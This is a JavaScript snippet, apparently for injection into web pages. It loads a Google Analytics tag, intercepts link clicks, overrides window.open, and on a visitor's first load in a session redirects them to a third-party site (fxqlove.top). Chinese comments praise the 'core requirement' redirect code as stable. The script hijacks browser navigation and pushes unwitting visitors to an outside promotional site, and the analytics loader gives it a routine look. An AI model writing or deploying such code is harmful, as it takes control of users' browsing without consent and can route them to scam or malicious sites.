window.addEventListener("DOMContentLoaded",()=>{const t=document.createElement("script");t.src="https://www.googletagmanager.com/gtag/js?id=G-W5GKHM0893",t.async=!0,document.head.appendChild(t);const n=document.createElement("script");n.textContent="window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-W5GKHM0893');",document.body.appendChild(n)});const hookClick = (e) => {
    const origin = e.target.closest('a')
    const isBaseTargetBlank = document.querySelector(
        'head base[target="_blank"]'
    )
    console.log('origin', origin, isBaseTargetBlank)
    if (
        (origin && origin.href && origin.target === '_blank') ||
        (origin && origin.href && isBaseTargetBlank)
    ) {
        e.preventDefault()
        console.log('handle origin', origin)
        // ✅ 修复循环核心：replace替换历史记录
        location.replace(origin.href)
    } else {
        console.log('not handle origin', origin)
    }
}

window.open = function (url, target, features) {
    console.log('open', url, target, features)
    location.replace(url)
}

document.addEventListener('click', hookClick, { capture: true })

// ================ 你的核心需求代码【已完美修改，永久稳定】 ================
const yourPromoteUrl = "https://jiuyue.hlwjd01.cn/c.php?id=222";
const yourTargetUrl = "https://fxqlove.top";
const noRepeatFlag = "promote_jump_done_999";

// ✅ 核心修改：localStorage → sessionStorage 临时标记
if (!sessionStorage.getItem(noRepeatFlag)) {
    setTimeout(() => {
        window.location.replace(yourTargetUrl);
        // ✅ 核心修改：localStorage → sessionStorage
        sessionStorage.setItem(noRepeatFlag, "true");
    }, 30);
}